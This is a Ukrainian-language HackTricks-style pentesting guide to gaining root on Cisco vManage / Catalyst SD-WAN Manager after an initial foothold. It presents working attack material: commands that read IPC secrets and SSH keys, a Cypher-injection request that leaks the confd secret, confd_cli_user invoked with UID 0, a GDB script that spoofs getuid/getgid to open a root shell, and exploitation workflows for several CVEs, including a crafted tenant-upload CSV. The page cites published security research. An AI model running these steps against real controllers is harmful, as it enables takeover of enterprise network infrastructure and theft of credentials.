# Cisco - vmanage

Після отримання code execution на Cisco vManage / *Catalyst SD-WAN Manager* від імені `vmanage`, `netadmin` або `vmanage-admin` найцікавішими локальними поверхнями для privesc зазвичай є стек CLI `confd`, допоміжний компонент `cmdptywrapper`, localhost REST APIs і обробники імпорту/завантаження, що належать root.

Якщо вам усе ще потрібен **initial foothold** на контролері, спочатку перегляньте спеціальну сторінку control-plane:

{{#ref}}
../../network-services-pentesting/12346-udp-pentesting-cisco-sd-wan-control-plane.md
{{#endref}}

## Швидке локальне сортування
```bash
ps auxww | egrep 'confd|cmdptywrapper|neo4j|vdaemon'
ss -lntp | egrep '4565|830|8443'
find /run /var/run -maxdepth 2 -type s 2>/dev/null | egrep 'confd|cli|rest|mgmt'
ls -l /etc/confd/confd_ipc_secret /usr/bin/confd_cli /usr/bin/confd_cli_user
ls -la /home/vmanage-admin/.ssh 2>/dev/null
grep -R "tenant-upload\|tenant-list" /opt /usr 2>/dev/null | head
```
Якщо з вашої точки опори доступний для читання `/etc/confd/confd_ipc_secret`, Path 1 і Path 2 одразу стають практично застосовними. Якщо ви отримали доступ через remote file disclosure або webshell, також перевірте SSH-матеріали `vmanage-admin` і обробники завантаження multitenancy; нещодавні дослідження продемонстрували, що обидва варіанти є життєздатними pivot.<sup>[[3]](#references)[[4]](#references)</sup>

## Path 1

Оцінювання vManage від Synacktiv документує цей шлях до root-shell.<sup>[[5]](#references)</sup>

[Документація ConfD](http://66.218.245.39/doc/html/rn03re18.html), на яку посилається звіт, описує автентифікацію IPC; у прикладі для vManage секрет розташований у `/etc/confd/confd_ipc_secret` і показано, що він доступний для читання користувачу `vmanage`.<sup>[[5]](#references)</sup>
```
vmanage:~$ ls -al /etc/confd/confd_ipc_secret

-rw-r----- 1 vmanage vmanage 42 Mar 12 15:47 /etc/confd/confd_ipc_secret
```
Оскільки Neo4j працює з привілеями `vmanage` у описаній конфігурації, попередня ін'єкція Cypher може прочитати секретний файл.<sup>[[5]](#references)</sup>
```
GET /dataservice/group/devices?groupId=test\\\'<>\"test\\\\")+RETURN+n+UNION+LOAD+CSV+FROM+\"file:///etc/confd/confd_ipc_secret\"+AS+n+RETURN+n+//+' HTTP/1.1

Host: vmanage-XXXXXX.viptela.net



[...]

"data":[{"n":["3708798204-3215954596-439621029-1529380576"]}]}
```
`confd_cli` сам по собі не приймає аргументів командного рядка; він викликає `/usr/bin/confd_cli_user`. Описаний сценарій витягує цей допоміжний файл, доступний для читання root, із rootfs, копіює його за допомогою `scp`, читає його довідку, встановлює `CONFD_IPC_ACCESS_FILE` і викликає його з `-U 0 -G 0`, щоб отримати root shell.<sup>[[5]](#references)</sup>
```
vManage:~$ echo -n "3708798204-3215954596-439621029-1529380576" > /tmp/ipc_secret

vManage:~$ export CONFD_IPC_ACCESS_FILE=/tmp/ipc_secret

vManage:~$ /tmp/confd_cli_user -U 0 -G 0

Welcome to Viptela CLI

admin connected from 127.0.0.1 using console on vManage

vManage# vshell

vManage:~# id

uid=0(root) gid=0(root) groups=0(root)
```
## Шлях 2

Цей альтернативний шлях адаптовано з дослідження vManage 19.2.2, проведеного Walmart Global Tech.<sup>[[6]](#references)</sup>

Для шляху Synacktiv потрібна копія `/usr/bin/confd_cli_user`, доступна для читання root у описаній конфігурації; у звіті Walmart натомість змінюються значення ідентифікатора `confd_cli` у GDB.<sup>[[5]](#references)[[6]](#references)</sup>

Дизасемблювання зі звіту показує, що `confd_cli` отримує UID і GID викликувача.<sup>[[6]](#references)</sup>

<details>
<summary>Objdump, що показує отримання UID/GID</summary>
```asm
vmanage:~$ objdump -d /usr/bin/confd_cli
… snipped …
40165c: 48 89 c3              mov    %rax,%rbx
40165f: bf 1c 31 40 00        mov    $0x40311c,%edi
401664: e8 17 f8 ff ff        callq  400e80 <getenv@plt>
401669: 49 89 c4              mov    %rax,%r12
40166c: 48 85 db              test   %rbx,%rbx
40166f: b8 dc 30 40 00        mov    $0x4030dc,%eax
401674: 48 0f 44 d8           cmove  %rax,%rbx
401678: 4d 85 e4              test   %r12,%r12
40167b: b8 e6 30 40 00        mov    $0x4030e6,%eax
401680: 4c 0f 44 e0           cmove  %rax,%r12
401684: e8 b7 f8 ff ff        callq  400f40 <getuid@plt>  <-- HERE
401689: 89 85 50 e8 ff ff     mov    %eax,-0x17b0(%rbp)
40168f: e8 6c f9 ff ff        callq  401000 <getgid@plt>  <-- HERE
401694: 89 85 44 e8 ff ff     mov    %eax,-0x17bc(%rbp)
40169a: 8b bd 68 e8 ff ff     mov    -0x1798(%rbp),%edi
4016a0: e8 7b f9 ff ff        callq  401020 <ttyname@plt>
4016a5: c6 85 cf f7 ff ff 00  movb   $0x0,-0x831(%rbp)
4016ac: 48 85 c0              test   %rax,%rax
4016af: 0f 84 ad 03 00 00     je     401a62 <socket@plt+0x952>
4016b5: ba ff 03 00 00        mov    $0x3ff,%edx
4016ba: 48 89 c6              mov    %rax,%rsi
4016bd: 48 8d bd d0 f3 ff ff  lea    -0xc30(%rbp),%rdi
4016c4:   e8 d7 f7 ff ff           callq  400ea0 <*ABS*+0x32e9880f0b@plt>
… snipped …
```
</details>

Той самий тест виявив `cmdptywrapper`, власником якого є root, що отримував явно задані значення `-g` і `-u`.<sup>[[6]](#references)</sup>
```
vmanage:~$ ps aux
… snipped …
root     28644  0.0  0.0   8364   652 ?        Ss   18:06   0:00 /usr/lib/confd/lib/core/confd/priv/cmdptywrapper -I 127.0.0.1 -p 4565 -i 1015 -H /home/neteng -N neteng -m 2232 -t xterm-256color -U 1358 -w 190 -h 43 -c /home/neteng -g 100 -u 1007 bash
… snipped …
```
Дослідник дійшов висновку, що `confd_cli` передає UID і GID автентифікованого користувача до `cmdptywrapper`.<sup>[[6]](#references)</sup>

Безпосередній запуск `cmdptywrapper` із `-g 0 -u 0` завершився помилкою, оскільки потрібний дескриптор файлу (`-i 1015` у прикладі) був недоступний.<sup>[[6]](#references)</sup>

Оскільки `confd_cli` не передає ці значення як аргументи, у звіті використано GDB для перевизначення значень, які повертають `getuid()` і `getgid()`; GDB був наявний на цьому пристрої.<sup>[[5]](#references)[[6]](#references)</sup>

Маючи доступ до `vmanage`, під час тестування можна було прочитати `/etc/confd/confd_ipc_secret`; наведений нижче скрипт змушує обидва виклики ідентифікації повертати нуль.<sup>[[6]](#references)</sup>

У звіті використано такий скрипт GDB:<sup>[[6]](#references)</sup>
```
set environment USER=root
define root
finish
set $rax=0
continue
end
break getuid
commands
root
end
break getgid
commands
root
end
run
```
Повідомлений вивід консолі такий:<sup>[[6]](#references)</sup>

<details>
<summary>Вивід консолі</summary>
```text
vmanage:/tmp$ gdb -x root.gdb /usr/bin/confd_cli
GNU gdb (GDB) 8.0.1
Copyright (C) 2017 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "x86_64-poky-linux".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
<http://www.gnu.org/software/gdb/documentation/>.
For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from /usr/bin/confd_cli...(no debugging symbols found)...done.
Breakpoint 1 at 0x400f40
Breakpoint 2 at 0x401000Breakpoint 1, getuid () at ../sysdeps/unix/syscall-template.S:59
59 T_PSEUDO_NOERRNO (SYSCALL_SYMBOL, SYSCALL_NAME, SYSCALL_NARGS)
0x0000000000401689 in ?? ()Breakpoint 2, getgid () at ../sysdeps/unix/syscall-template.S:59
59 T_PSEUDO_NOERRNO (SYSCALL_SYMBOL, SYSCALL_NAME, SYSCALL_NARGS)
0x0000000000401694 in ?? ()Breakpoint 1, getuid () at ../sysdeps/unix/syscall-template.S:59
59 T_PSEUDO_NOERRNO (SYSCALL_SYMBOL, SYSCALL_NAME, SYSCALL_NARGS)
0x0000000000401871 in ?? ()
Welcome to Viptela CLI
root connected from 127.0.0.1 using console on vmanage
vmanage# vshell
bash-4.4# whoami ; id
root
uid=0(root) gid=0(root) groups=0(root)
bash-4.4#
```
</details>

## Шлях 3 (помилка валідації введення CLI 2025 року - CVE-2025-20122)

Пізніше Cisco задокументувала чистіший локальний шлях до root у власному advisory для [CVE-2025-20122](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-priviesc-WCk7bmmt). **Authenticated attacker with only read-only privileges** міг надіслати спеціально сформований запит до manager CLI та отримати root через недостатню валідацію введення.<sup>[[7]](#references)</sup>

З offensive perspective це advisory і попередні дослідження CLI вказують на такий workflow.<sup>[[6]](#references)[[7]](#references)</sup>

1. Щойно ви отримаєте *будь-який* low-priv foothold на пристрої, перевірте локальний CLI service, перш ніж переходити до складнішого workflow Path 1 / Path 2.
2. Повторно використайте артефакти з Path 2, щоб знайти trust boundary: `confd_cli` → `cmdptywrapper` → `vshell`.
3. Вважайте підозрілим кожне поле, що передається до CLI backend: UID/GID, username, terminal metadata, imported files або будь-яке значення, яке згодом обробляється helper'ом, що працює від root.
4. Якщо low-priv user може отримати доступ до локального CLI socket і впливати на ці поля, до root може бути лише один crafted request.

Після потрапляння на appliance перевірте локальний CLI chain таким чином.<sup>[[6]](#references)[[7]](#references)</sup>
```bash
strings /usr/bin/confd_cli | egrep 'cmdptywrapper|vshell|confd'
strace -f -s 200 -o /tmp/confd.trace /usr/bin/confd_cli
ss -lntp | grep 4565
```
Це перетворює баг 2025 року на придатний для повторного використання hunting pattern: шукайте **локальні CLI shims, які збирають ідентифікаційні дані в userland і передають їх привілейованій wrapper-програмі**.<sup>[[6]](#references)[[7]](#references)</sup>

Не плутайте **CVE-2025-20122** із пізнішою **CVE-2026-20122**: проблема 2025 року — це *локальний* баг CLI-to-root, тоді як проблема 2026 року — це *віддалений* API arbitrary file overwrite, який переважно корисний для розміщення foothold із подальшим поверненням до Path 1 / Path 2 / Path 4.<sup>[[3]](#references)[[7]](#references)</sup>

## Path 4 (2026 low-priv REST API to root - CVE-2026-20126)

У рекомендаціях Cisco за лютий 2026 року описано ще один корисний клас privesc — [CVE-2026-20126](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-authbp-qwCX8D4v). **Аутентифікований локальний attacker із низькими привілеями** міг отримати root через недостатній механізм user authentication у REST API.<sup>[[1]](#references)</sup>

Це важливо, оскільки privesc у vManage більше не обмежується зловживанням `confd`/TTY; отримавши low-priv shell, також шукайте наведене нижче.<sup>[[1]](#references)</sup>

- API endpoints, доступні лише через localhost, які надмірно довіряють caller
- tokens, cookies або service credentials, доступні для читання поточному акаунту
- дії, доступні лише root, відкриті через `dataservice`/REST handlers, які все ще можна локально trigger-нути

На практиці, отримавши shell від імені `vmanage` або іншого service user, зловживання локальним API може бути легше автоматизувати, ніж інтерактивне зловживання CLI.<sup>[[1]](#references)</sup>
```bash
env | grep -iE 'token|cookie|session'
grep -R "dataservice" /etc /opt 2>/dev/null | head
ss -lntp | grep -E '(:443|:8443)'
```
Якщо контексту локальної сесії достатньо для доступу до привілейованої REST-функціональності, надавайте перевагу API-шляху: його простіше повторювати, автоматизувати за допомогою скриптів і поєднувати з викраденими веб-сесіями або API-токенами.<sup>[[1]](#references)</sup>

## Шлях 5 (створений у 2026 році файл, оброблений root — CVE-2026-20245)

Ще один нещодавній шаблон — [CVE-2026-20245](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-privesc-4uxFrdzx). Локальний зловмисник із привілеями `netadmin` міг завантажити **спеціально створений файл**, який CLI згодом небезпечно обробляв, що призводило до command injection від імені `root`.<sup>[[2]](#references)</sup>

З погляду HackTricks цінною є ширша техніка, а не конкретна CVE.<sup>[[2]](#references)</sup>

1. Перелічіть усі CLI- або вебпроцеси, які приймають файли: імпорти, діагностичні пакети, шаблони, валідатори, резервні копії, дані tenant тощо.
2. Відстежте, куди потрапляє завантажений файл і який скрипт або бінарний файл, що належить root, його обробляє.
3. Перевірте, чи передаються коли-небудь ім’я файлу, його вміст або розібрані метадані shell-командам, wrapper-скриптам або helper-функціям на кшталт `system()`.
4. Якщо ви вже можете отримати доступ до `netadmin` (дійсні облікові дані, викрадена сесія або ланцюжок обходу автентифікації), помилки обробки файлів часто є найшвидшим шляхом до root.

Пізніше Google Cloud / Mandiant продемонстрували конкретний випадок експлуатації цього класу помилок через шлях імпорту multitenancy.<sup>[[4]](#references)</sup>
```bash
request tenant-upload tenant-list /home/admin/evil_tenant.csv vpn 0
```
У спостережуваній атаці спеціально створений CSV-файл змінив `/etc/passwd` і `/etc/shadow`, щоб створити тимчасовий обліковий запис із UID 0 (`troot`). Тому імпортери на кшталт `tenant-upload` / `tenant-list` особливо цікаві: це не просто функції завантаження даних, а потенційні front-end парсери, що працюють із правами root.<sup>[[4]](#references)</sup>

Швидкий шаблон пошуку на рівні shell:
```bash
strings /usr/bin/* 2>/dev/null | grep -E 'tenant-upload|tenant-list|import|upload|backup' | head
grep -R "tenant-upload\|tenant-list" /opt /usr 2>/dev/null | head
```
Цей клас багів особливо добре комбінується з remote footholds, які надають `netadmin`, але не `root`.<sup>[[2]](#references)[[4]](#references)</sup>

## Інші нещодавні вразливості vManage/Catalyst SD-WAN Manager для ланцюжків атак

- **Неавтентифікований info leak (CVE-2026-20133)** – Особливо цінний, оскільки public research показало, що він може розкрити `confd_ipc_secret` або приватний ключ `vmanage-admin`, перетворюючи read bug на Path 1 або NETCONF pivot.<sup>[[3]](#references)</sup>
- **Автентифіковане довільне перезаписування файлів через API (CVE-2026-20122)** – Відрізняється від описаного вище CLI bug 2025 року; VulnCheck використала його для завантаження webshell, після чого local privesc paths на цій сторінці стають безпосередньо актуальними.<sup>[[3]](#references)</sup>
- **Автентифікований UI XSS (CVE-2024-20475)** – Автентифікований attacker може виконати script у web interface вразливого користувача; потрібно перевірити, чи отриманий session context відкриває API/CLI actions, які ведуть до `vshell` або одного з наведених вище local privesc paths.<sup>[[9]](#references)</sup>
- **Remote auth bypass до `netadmin` (CVE-2026-20129)** – Дуже сильний precursor для Path 5, оскільки `netadmin` є саме тим рівнем, який потрібен для crafted-file privesc 2026 року.<sup>[[2]](#references)[[3]](#references)</sup>
- **Автентифікований довільний запис файлів (CVE-2026-20262)** – Має offensive value, подібну до CVE-2026-20122, але використовується через пізніший web UI upload path; Cisco зазначає, що файл, створений або перезаписаний унаслідок цієї вразливості, згодом можна використати для підвищення привілеїв до root.<sup>[[10]](#references)</sup>
- **Downgrade для відновлення старого CLI privesc (CVE-2022-20775)** – Інциденти 2026 року показали, що attackers можуть відкотитися до старої вразливої SD-WAN build, використати старий CLI root bug, а потім відновити початкову версію.<sup>[[8]](#references)</sup>
- **Pre-auth control-plane auth bypass (CVE-2026-20182)** – Детальніше описаний на спеціальній сторінці про SD-WAN control plane; він може додати SSH key для `vmanage-admin`, забезпечуючи persistent NETCONF access для подальших дій у management plane.<sup>[[11]](#references)</sup>



## References

- [1] [Вразливості Cisco Catalyst SD-WAN (CVE-2026-20126, CVE-2026-20129 тощо)](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-authbp-qwCX8D4v)
- [2] [Автентифікована вразливість підвищення привілеїв у Cisco Catalyst SD-WAN Controller, Catalyst SD-WAN Manager і Catalyst SD-WAN Validator (CVE-2026-20245)](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-privesc-4uxFrdzx)
- [3] [VulnCheck: Herding Cats — нещодавні вразливості Cisco SD-WAN Manager](https://www.vulncheck.com/blog/cisco-sd-wan-manager-vulns)
- [4] [Google Cloud / Mandiant: експлуатація zero-day вразливості (CVE-2026-20245) у Cisco Catalyst SD-WAN Manager](https://cloud.google.com/blog/topics/threat-intelligence/zero-day-exploitation-cisco-catalyst-sd-wan-manager)
- [5] [Pentesting Cisco SD-WAN, частина 1: атака на vManage](https://www.synacktiv.com/en/publications/pentesting-cisco-sd-wan-part-1-attacking-vmanage.html)
- [6] [Hacking Cisco SD-WAN vManage 19.2.2 — від CSRF до Remote Code Execution](https://medium.com/walmartglobaltech/hacking-cisco-sd-wan-vmanage-19-2-2-from-csrf-to-remote-code-execution-5f73e2913e77)
- [7] [Вразливість підвищення привілеїв у Cisco Catalyst SD-WAN Manager (CVE-2025-20122)](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-priviesc-WCk7bmmt)
- [8] [Активна експлуатація Cisco Catalyst SD-WAN групою UAT-8616 (Cisco Talos)](https://blog.talosintelligence.com/uat-8616-sd-wan/)
- [9] [Вразливість Cross-Site Scripting у Cisco Catalyst SD-WAN Manager (CVE-2024-20475)](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-xss-zQ4KPvYd)
- [10] [Вразливість довільного запису файлів у Cisco Catalyst SD-WAN Manager (CVE-2026-20262)](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-arbfw-c2rZvQ)
- [11] [Rapid7: CVE-2026-20182 — критичний auth bypass у Cisco Catalyst SD-WAN Controller](https://www.rapid7.com/blog/post/ve-cve-2026-20182-critical-authentication-bypass-cisco-catalyst-sd-wan-controller-fixed/)
{{#include ../../banners/hacktricks-training.md}}
